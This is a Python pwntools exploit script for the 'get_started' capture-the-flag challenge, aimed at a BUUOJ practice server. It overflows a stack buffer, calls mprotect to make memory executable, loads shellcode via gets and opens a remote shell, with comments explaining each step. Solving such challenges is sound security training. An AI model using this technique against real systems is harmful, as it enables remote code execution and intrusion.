from pwn import *
context.arch = 'i386'

def local(p):
	payload = 'A'*0x38 + p32(ELF('../Desktop/get_started').sym['get_flag']) + p32(0x08048A20) + p32(0x308CD64F) + p32(0x195719D1)
	# call function get_flag, and transfer the argv at sametime
	p.sendline(payload)
	print p.recv()
# local(process('./get_started'))
# when connected the server, this way can't get flag successly

def remoted(p):
	elf = ELF('../Desktop/get_started')
	mprotect_addr = elf.sym['mprotect']
	shellcode_addr = 0x080EA000
	# when we debugging, we could find try to change the policy of section .bss was failed,
	# but at the process, we find a address of menmory could be changed (0x080EA000) 
	main = elf.sym['main']
	shellcode = asm(shellcraft.sh())
	payload = 'A'*0x38 + p32(mprotect_addr) + p32(main) + p32(shellcode_addr) + p32(len(shellcode)) + p32(0x7)
	# mprotect(const void *start, size_t len, int prot),0x7 means this part of menmory could be read,write,execve
	p.sendline(payload)
	sleep(1)

	gets_plt = elf.sym['gets']
	payload = 'A'*0x38 + p32(gets_plt) + p32(main) + p32(shellcode_addr)
	# get shellcode to section .bss
	p.sendline(payload)
	sleep(1)
	p.sendline(shellcode)

	payload = 'A'*0x38 + p32(shellcode_addr)
	p.sendline(payload)
	sleep(1)
	p.interactive()

# the way get flag loacly were not effectively when remote the server
# but we find function mprotect im program, so we could change the policy of some where and write shellcode  to get shell
remoted(remote('node3.buuoj.cn',25170))
